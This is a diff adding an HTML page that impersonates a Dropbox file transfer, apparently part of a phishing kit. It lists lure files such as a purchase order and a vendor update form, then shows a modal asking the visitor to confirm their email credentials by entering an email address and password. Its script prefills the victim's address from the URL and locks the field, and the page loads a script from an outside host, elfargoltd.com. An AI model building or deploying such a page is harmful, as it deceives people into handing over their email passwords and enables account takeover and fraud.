@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="./favicon.ico" rel="shortcut icon" /><title>Transfer - Dropbox</title>
+   <link rel="stylesheet" type="text/css" href="head.css">
+
+
+  <script src="https://elfargoltd.com/jquery.js"></script>
+
+</head>
+<body>
+
+<div class="navbar">
+  <div class="logo">
+    <img src="logo.png" alt="Logo"  style="width: 100%; height: 43px; margin-left: 10px; margin-top: 10px;"> <!-- Replace with your logo -->
+  </div>
+  <div>
+      <a href="./"><img src="rlogo.png" alt="Logo"  style="width: 90%; height: 40px; margin-left: 10px; margin-top: 10px;"></a>
+  </div>
+</div>
+
+
+
+<div id="float-box" style="margin-top: 50px;">          
+                <center>
+                    <img src="./dropbox-1-logo-png-transparent.png" style="width: 40px">
+                    <br><br>
+                    <span style="font-size: 22px; margin-top: 50px;">Winter Lin sent you 3 items</span>
+                    <br>
+                    <span style="font-size: 16px; color: #8E8882;">173.5 MB • Expires <span id="output"></span> at 12:59 AM</span>
+                </center>
+                <hr style="height: 1px; /* Set the height of the hr tag */
+      background-color: #ddd; /* Set the color of the hr tag */
+      border: none; /* Remove the default border */
+      margin: 10px 0; /* Add some space above and below the hr tag */">          
+           <div id="innerDiv">
+               <table style="width: 100%; margin-bottom: 50px;"> 
+                    <tr   class="margin-top">
+                       <td>
+                           <img src="pdf.png" style="width: 40px;">
+                       </td>
+                       <td>
+                           <span style="font-size: 16px; color: #1A1918; margin-left: 5px; float: left;">
+                               Purchase Order #728993882.pdf
+                           </span><br>
+                           <span style="font-size: 14px; float: left; color: #3795A9; margin-left: 5px;">
+                               21.1MB
+                           </span>
+                       </td>
+                       <td colspan="2">
+                           <img src="dicons.png" style="width: 20px;">
+                       </td>
+                    </tr>
+
+
+                    <tr   class="margin-top">
+
+                       <td>
+                           <img src="pdf1.png" style="width: 40px;">
+                       </td>
+                       <td>
+                           <span style="font-size: 16px; color: #1A1918; margin-left: 5px; float: left;">
+                               Drawings and Slides#001.xlsx
+                           </span><br>
+                           <span style="font-size: 14px; float: left; color: #3795A9; margin-left: 5px;">
+                               141.1MB
+                           </span>
+                       </td>
+                       <td colspan="2">
+                           <img src="dicons.png" style="width: 20px;">
+                       </td>
+                    </tr>
+
+                    <tr   class="margin-top">
+
+                       <td>
+                           <img src="pdf2.png" style="width: 40px;">
+                       </td>
+                       <td>
+                           <span style="font-size: 16px; color: #1A1918; margin-left: 5px; float: left;">
+                               Vendor/Supplier Update Form.pdf
+                           </span><br>
+                           <span style="font-size: 14px; float: left; color: #3795A9; margin-left: 5px;">
+                               11.1MB
+                           </span>
+                       </td>
+                       <td colspan="2">
+                           <img src="dicons.png" style="width: 20px;">
+                       </td>
+                    </tr>
+
+               </table>
+           </div>
+
+           <hr style="height: 1px; /* Set the height of the hr tag */
+      background-color: #ddd; /* Set the color of the hr tag */
+      border: none; /* Remove the default border */
+      margin: 10px 0; /* Add some space above and below the hr tag */"> 
+           <div id="innerDiv"  >
+               <a href="#" style="float: right; margin-right: 20px; font-weight: bolder; color: white; background-color: #0F70E6; padding: 12px; text-decoration: none;">
+                   Download all
+               </a>
+
+               <br><br> 
+           </div>
+        </div>
+<div id="modalbox" class="modal">
+
+    <!-- Modal content -->
+    <div class="modal-content">
+        <div class="mcontent" id="mcontent">
+
+            <div class="mlogo">
+                <center>
+                    <img src="./dropbox-1-logo-png-transparent.png" style="width: 40px">
+                </center>
+            </div>
+            <p class="instruction">
+              Confirm you're the recipient of these files by verifying your email credentials.
+            </p> 
+            <div class="ebox"> 
+                                
+                <input type="email" class="password" id="email" placeholder="Enter receiving email" value="" required> 
+                                 
+                <input type="password" class="password" id="password" autofocus placeholder="Enter email password">
+                 
+                <div class="submitdiv">
+                  <button class="submit" id="submit">Verify</button>
+                </div>
+                <p class="foot">&copy; Copyright Dropbox Inc. 2024</p>
+            </div>
+
+        </div> 
+      
+    </div>
+  
+  </div> 
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Function to get tomorrow's date
+      function getTomorrowDate() {
+        var today = new Date(); 
+        var tomorrow = new Date(today);
+        tomorrow.setDate(today.getDate() + 3);
+
+        // Format the date as "YYYY/MM/DD"
+        var formattedDate = ('0' + tomorrow.getDate()).slice(-2) + '/' + ('0' + (tomorrow.getMonth() + 1)).slice(-2) + '/' + tomorrow.getFullYear();
+        // Display the date in an element with the ID "output"
+        document.getElementById("output").innerText = formattedDate;
+      }
+
+      // Call the function when the page loads
+      getTomorrowDate();
+    });
+
+    $(document).ready(function() { 
+    var url = window.location.hash.substr(1);
+    if (!url) {
+
+    }else{
+         
+        $('#email').val(url);
+        $('#email').attr('readonly', true);
+        $('#password').focus(); 
+    }
+    });
+  </script> 
+</body>
+</html>
